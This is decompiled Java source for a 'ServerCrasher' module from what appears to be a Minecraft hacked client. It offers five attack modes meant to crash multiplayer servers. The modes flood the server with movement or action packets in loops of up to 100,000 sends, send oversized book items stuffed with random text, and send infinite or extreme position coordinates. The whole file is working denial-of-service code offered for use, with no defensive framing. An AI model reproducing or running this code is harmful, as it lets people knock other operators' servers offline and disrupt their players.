// 
// Decompiled by Procyon v0.6.0
// 

package com.mentalfrostbyte.jello.mods.impl.world;

import com.mentalfrostbyte.jello.mods.Category;
import com.mentalfrostbyte.jello.mods.PremiumModule;
import com.mentalfrostbyte.jello.settings.impl.StringSetting;
import mapped.*;
import net.minecraft.item.ItemStack;

import java.util.AbstractList;

public class ServerCrasher extends PremiumModule
{
    private int field15991;
    
    public ServerCrasher() {
        super("ServerCrasher", "Crashes a server", Category.WORLD);
        this.addSetting(new StringSetting("Mode", "Crasher mode", 0, new String[] { "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze" }));
    }
    
    @Override
    public void method9879() {
        this.field15991 = 0;
    }
    
    @EventListener
    private void method10629(final Class5743 class5743) {
        if (!this.method9906()) {
            return;
        }
        if (ServerCrasher.mc.method5284()) {
            this.method9910();
            return;
        }
        final String method9887 = this.method9887("Mode");
        switch (method9887) {
            case "Flying Enabled": {
                final double field2395 = ServerCrasher.mc.player.posX;
                final double field2396 = ServerCrasher.mc.player.posY;
                final double field2397 = ServerCrasher.mc.player.posZ;
                double n2 = 0.0;
                for (int i = 0; i < 200; ++i) {
                    n2 = i * 9;
                    ServerCrasher.mc.method5269().method17292(new Class4354(field2395, field2396 + n2, field2397, false));
                }
                for (int j = 0; j < 50000; ++j) {
                    final double n3 = j * 7;
                    ServerCrasher.mc.method5269().method17292(new Class4354(field2395 - n3, field2396 + n2, field2397 + n3, false));
                }
                Class9274.method34209("Trying to crash the server..");
                this.method9910();
                break;
            }
            case "Vanilla": {
                if (this.field15991++ >= 10) {
                    this.field15991 = 0;
                    for (int k = 0; k < 100000; ++k) {
                        ServerCrasher.mc.method5269().method17292(new Class4380(Class316.field1877));
                    }
                    Class9274.method34209("Trying to crash the server..");
                    break;
                }
                break;
            }
            case "Book": {
                final ItemStack class5744 = new ItemStack(Items.field31512);
                final ListNBT class5745 = new ListNBT();
                final CompoundNBT class5746 = new CompoundNBT();
                String string = "";
                for (int l = 0; l < 5000; ++l) {
                    string += (char)Math.round(32.0f + (float)Math.random() * 94.0f);
                }
                for (int n4 = 0; n4 < 50; ++n4) {
                    ((AbstractList<StringNBT>)class5745).add(new StringNBT(string));
                }
                class5746.putString("author", "LeakedPvP");
                class5746.putString("title", "Sigma");
                class5746.put("pages", class5745);
                class5744.method27676("pages", class5745);
                class5744.method27663(class5746);
                for (int n5 = 0; n5 < 100; ++n5) {
                    try {
                        ServerCrasher.mc.method5269().method17292(new Class4287(0, class5744));
                    }
                    catch (final Exception ex) {}
                }
                this.method9910();
                break;
            }
            case "Infinity": {
                ServerCrasher.mc.method5269().method17292(new Class4354(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                Class9274.method34209("Trying to crash the server..");
                this.method9910();
                break;
            }
            case "BrainFreeze": {
                ServerCrasher.mc.method5269().method17292(new Class4354(ServerCrasher.mc.player.posX + 9999.0, ServerCrasher.mc.player.posY + 9999.0, ServerCrasher.mc.player.posZ + 9999.0, false));
                ServerCrasher.mc.method5269().method17292(new Class4354(ServerCrasher.mc.player.posX, ServerCrasher.mc.player.getBoundingBox().minY, ServerCrasher.mc.player.posZ + 9999.0, ServerCrasher.mc.player.onGround));
                if (this.field15991++ >= 200) {
                    this.method9910();
                    Class9274.method34209("Trying to crash the server..");
                    break;
                }
                break;
            }
        }
    }
}